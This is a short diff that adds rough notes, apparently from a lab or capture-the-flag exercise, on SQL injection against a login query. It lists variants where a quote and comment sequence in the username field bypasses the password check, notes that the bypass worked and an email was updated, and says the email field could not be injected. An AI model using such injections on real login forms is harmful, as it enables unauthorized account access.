@@ -1,0 +1,11 @@
+select * from user where username = admin and password = admin
+
+select * from user where username = 'admin and password = admin
+
+select * from user where username = admin'-- and password = admin
+
+select * from user where username = 'administrator and password = admin
+
+it worked and also email has also successfully updated
+
+cant inject on email field due to it is post
